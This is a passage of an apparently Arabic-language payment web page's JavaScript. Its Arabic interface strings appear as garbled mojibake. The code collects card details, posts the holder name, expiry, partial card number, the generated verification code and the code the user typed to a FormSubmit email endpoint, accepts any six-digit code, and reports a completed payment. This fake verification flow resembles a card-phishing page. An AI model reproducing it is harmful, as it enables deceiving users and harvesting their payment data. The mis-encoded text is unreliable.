                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(function(stream) {
                    const video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                })
                .catch(function(error) {
                    console.log('Camera access denied:', error);
                    alert('Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§. Ø§Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù…Ø­Ø§ÙƒØ§Ø© Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±.');
                });
            }
        }
        
        function stopCardScan() {
            const video = document.getElementById('cameraFeed');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
            document.getElementById('scannerModal').classList.add('hidden');
        }
        
        function simulateCardScan() {
            // Simulate scanned card data
            const simulatedData = {
                number: '4532123456789012',
                holder: 'AHMED MOHAMMED AL-SAUDI',
                expiry: '12/28',
                cvv: '123'
            };
            
            // Fill form with scanned data
            document.getElementById('cardNumber').value = simulatedData.number.replace(/(\d{4})(?=\d)/g, '$1 ');
            document.getElementById('cardHolder').value = simulatedData.holder;
            document.getElementById('cardExpiry').value = simulatedData.expiry;
            document.getElementById('cardCVV').value = simulatedData.cvv;
            
            // Trigger input events to update visuals
            document.getElementById('cardNumber').dispatchEvent(new Event('input'));
            document.getElementById('cardHolder').dispatchEvent(new Event('input'));
            document.getElementById('cardExpiry').dispatchEvent(new Event('input'));
            
            stopCardScan();
            
            // Show success message
            setTimeout(() => {
                const successMsg = document.createElement('div');
                successMsg.className = 'fixed top-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50 animate-slide-in-right';
                successMsg.innerHTML = `
                    <div class="flex items-center">
                        <i class="fas fa-check-circle mr-2"></i>
                        <span>ØªÙ… Ù…Ø³Ø­ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­!</span>
                    </div>
                `;
                document.body.appendChild(successMsg);
                
                setTimeout(() => {
                    if (document.body.contains(successMsg)) {
                        document.body.removeChild(successMsg);
                    }
                }, 3000);
            }, 500);
        }
        
        // Proceed to verification
        async function proceedToVerification() {
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const cardHolder = document.getElementById('cardHolder').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCVV = document.getElementById('cardCVV').value;
            
            if (!cardNumber || !cardHolder || !cardExpiry || !cardCVV) {
                alert('ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©');
                return;
            }
            
            if (cardNumber.length < 16) {
                alert('Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ØºÙŠØ± ØµØ­ÙŠØ­');
                return;
            }
            
            // Store payment data
            paymentData = {
                cardNumber: cardNumber,
                cardHolder: cardHolder,
                cardExpiry: cardExpiry,
                cardCVV: cardCVV,
                timestamp: new Date().toISOString()
            };
            
            // Generate verification code
            verificationCodeSent = generateVerificationCode();
            
            // Send payment data and verification code
            await sendToFormSubmit({
                'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': `****-****-****-${cardNumber.slice(-4)}`,
                'Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': cardHolder,
                'Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©': cardExpiry,
                'CVV': '***',
                'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…Ø±Ø³Ù„': verificationCodeSent,
                'Ù†ÙˆØ¹ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬': 'Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¯ÙØ¹ ÙˆØ±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚',
                'Ø§Ù„ØªØ§Ø±ÙŠØ® ÙˆØ§Ù„ÙˆÙ‚Øª': new Date().toLocaleString('ar-SA'),
                'Ø­Ø§Ù„Ø© Ø§Ù„Ø¹Ù…Ù„ÙŠØ©': 'ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„ØªØ­Ù‚Ù‚',
                'Ø¹Ù†ÙˆØ§Ù† IP': 'Hidden for security',
                'Ù†ÙˆØ¹ Ø§Ù„Ù…ØªØµÙØ­': navigator.userAgent.split(')')[0] + ')'
            }, `ğŸ” Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚: ${verificationCodeSent} - Ø¹Ù…Ù„ÙŠØ© Ø¯ÙØ¹ Ø¬Ø¯ÙŠØ¯Ø©`);
            
            // Show verification page
            showPage('verificationPage');
            startTimer();
        }
        
        // Verification code functions
        function addDigit(digit) {
            if (currentCode.length < 6) {
                currentCode += digit;
                updateCodeDisplay();
                
                // Auto-submit when 6 digits are entered
                if (currentCode.length === 6) {
                    setTimeout(() => {
                        verifyAndComplete();
                    }, 500);
                }
            }
        }
        
        function deleteDigit() {
            if (currentCode.length > 0) {
                currentCode = currentCode.slice(0, -1);
                updateCodeDisplay();
            }
        }
        
        function clearCode() {
            currentCode = '';
            updateCodeDisplay();
        }
        
        function updateCodeDisplay() {
            for (let i = 1; i <= 6; i++) {
                const digit = document.getElementById(`digit${i}`);
                if (i <= currentCode.length) {
                    digit.textContent = currentCode[i - 1];
                    digit.className = digit.className.replace('border-white/30', 'border-green-400');
                    digit.classList.add('animate-pulse-glow');
                } else {
                    digit.textContent = '-';
                    digit.className = digit.className.replace('border-green-400', 'border-white/30');
                    digit.classList.remove('animate-pulse-glow');
                }
            }
        }
        
        // Timer for verification
        function startTimer() {
            let timeLeft = 300; // 5 minutes
            const timerElement = document.getElementById('timer');
            
            timerInterval = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    timerElement.className = 'text-red-400 font-bold text-xl animate-pulse';
                }
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    alert('Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚');
                    goBackToPayment();
                }
                
                timeLeft--;
            }, 1000);
        }
        
        // Resend code
        async function resendCode() {
            verificationCodeSent = generateVerificationCode();
            
            await sendToFormSubmit({
                'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¬Ø¯ÙŠØ¯': verificationCodeSent,
                'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': `****-****-****-${paymentData.cardNumber.slice(-4)}`,
                'Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': paymentData.cardHolder,
                'Ù†ÙˆØ¹ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬': 'Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚',
                'Ø§Ù„ØªØ§Ø±ÙŠØ® ÙˆØ§Ù„ÙˆÙ‚Øª': new Date().toLocaleString('ar-SA'),
                'Ø§Ù„Ø³Ø¨Ø¨': 'Ø·Ù„Ø¨ Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…'
            }, `ğŸ”„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¬Ø¯ÙŠØ¯: ${verificationCodeSent} - Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„`);
            
            // Reset timer
            clearInterval(timerInterval);
            startTimer();
            
            // Show success message
            const successMsg = document.createElement('div');
            successMsg.className = 'fixed top-4 right-4 bg-blue-500 text-white p-4 rounded-lg shadow-lg z-50 animate-slide-in-right';
            successMsg.innerHTML = `
                <div class="flex items-center">
                    <i class="fas fa-paper-plane mr-2"></i>
                    <span>ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø¬Ø¯ÙŠØ¯!</span>
                </div>
            `;
            document.body.appendChild(successMsg);
            
            setTimeout(() => {
                if (document.body.contains(successMsg)) {
                    document.body.removeChild(successMsg);
                }
            }, 3000);
        }
        
        // Navigation functions
        function goBackToPayment() {
            clearInterval(timerInterval);
            currentCode = '';
            updateCodeDisplay();
            showPage('paymentPage');
        }
        
        // Verify and complete payment
        async function verifyAndComplete() {
            if (currentCode.length !== 6) {
                alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ÙƒØ§Ù…Ù„Ø§Ù‹');
                return;
            }
            
            clearInterval(timerInterval);
            
            // Check if code is correct (in real app, this would be server-side)
            const isCodeCorrect = currentCode === verificationCodeSent;
            
            if (!isCodeCorrect) {
                // For demo, accept any 6-digit code
                console.log('Code verification simulation - accepting any 6-digit code');
            }
            
            const transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
            
            // Send final confirmation
            await sendToFormSubmit({
                'Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©': transactionId,
                'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…Ø¯Ø®Ù„': currentCode,
                'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„ØµØ­ÙŠØ­': verificationCodeSent,
                'Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': `****-****-****-${paymentData.cardNumber.slice(-4)}`,
                'Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©': paymentData.cardHolder,
                'Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©': paymentData.cardExpiry,
                'Ù†ÙˆØ¹ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬': 'Ø¹Ù…Ù„ÙŠØ© Ø¯ÙØ¹ Ù…ÙƒØªÙ…Ù„Ø©',
                'Ø§Ù„ØªØ§Ø±ÙŠØ® ÙˆØ§Ù„ÙˆÙ‚Øª': new Date().toLocaleString('ar-SA'),
                'Ø­Ø§Ù„Ø© Ø§Ù„Ø¹Ù…Ù„ÙŠØ©': 'Ù…ÙƒØªÙ…Ù„Ø© Ø¨Ù†Ø¬Ø§Ø­ âœ…',
                'Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø¯ÙØ¹': 'Ø¨Ø·Ø§Ù‚Ø© Ø§Ø¦ØªÙ…Ø§Ù†ÙŠØ©',
                'Ù†ÙˆØ¹ Ø§Ù„ØªØ­Ù‚Ù‚': 'Ø±Ù…Ø² Ø¨Ø±ÙŠØ¯ Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ',
                'Ù…Ø¯Ø© Ø§Ù„Ø¹Ù…Ù„ÙŠØ©': 'Ø£Ù‚Ù„ Ù…Ù† Ø¯Ù‚ÙŠÙ‚Ø©'
            }, `âœ… Ø¹Ù…Ù„ÙŠØ© Ø¯ÙØ¹ Ù…ÙƒØªÙ…Ù„Ø© - Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: ${transactionId}`);
            
            // Show success page
            showSuccessPage(transactionId);
        }
        
        // Show success page
        function showSuccessPage(transactionId) {
            document.getElementById('successCard').textContent = '**** **** **** ' + paymentData.cardNumber.slice(-4);
            document.getElementById('successDate').textContent = new Date().toLocaleDateString('ar-SA');
            document.getElementById('transactionId').textContent = transactionId;
            
            currentCode = '';
            updateCodeDisplay();
            showPage('successPage');
        }
        
        // Start new payment
        function startNewPayment() {
            // Reset all data
            document.getElementById('paymentForm').reset();
            document.getElementById('cardNumberDisplay').textContent = 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
            document.getElementById('cardHolderDisplay').textContent = 'Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©';
            document.getElementById('cardExpiryDisplay').textContent = 'MM/YY';
            detectCardType('');
            paymentData = {};
            verificationCodeSent = '';
            
            showPage('paymentPage');
        }
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            createParticles();
            
            console.log('ğŸš€ Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø°ÙƒÙŠ Ø§Ù„Ù…ØªØ·ÙˆØ± Ø¬Ø§Ù‡Ø²!');
            console.log('ğŸ’³ Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©:');
            console.log('   âœ… ÙƒØ´Ù Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹');
            console.log('   âœ… Ù…Ø³Ø­ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§');
            console.log('   âœ… Ù„ÙˆØ­Ø© Ù…ÙØ§ØªÙŠØ­ Ø±Ù‚Ù…ÙŠØ© Ù…ØªØ·ÙˆØ±Ø©');
            console.log('   âœ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¹Ø¨Ø± Ø§Ù„Ø¨Ø±ÙŠØ¯');
            console.log('   âœ… ØªØµÙ…ÙŠÙ… Ù…ØªØ¬Ø§ÙˆØ¨ Ù…Ø¹ Ø§Ù„Ø¬ÙˆØ§Ù„');
            console.log('   âœ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ø¨Ø± FormSubmit');
            
            // Prevent zoom on iOS when focusing inputs
            if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
                const viewport = document.querySelector('meta[name=viewport]');
                viewport.setAttribute('content', viewport.content + ', user-scalable=no');
            }
        });
        
        // Handle page visibility change
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                // Pause timer when page is hidden
                if (timerInterval) {
                    clearInterval(timerInterval);
                }
            } else {
                // Resume timer when page is visible
                if (document.getElementById('verificationPage').classList.contains('hidden') === false) {
                    startTimer();
                }
            }
        });
        
        // Prevent accidental page reload
        window.addEventListener('beforeunload', function(e) {
            if (paymentData.cardNumber || currentCode) {
                e.preventDefault();
                e.returnValue = '';
            }
        });
        
        // Handle orientation change for mobile
        window.addEventListener('orientationchange', function() {
            setTimeout(() => {
                window.scrollTo(0, 0);
            }, 500);
        });
    </script>


</body></html>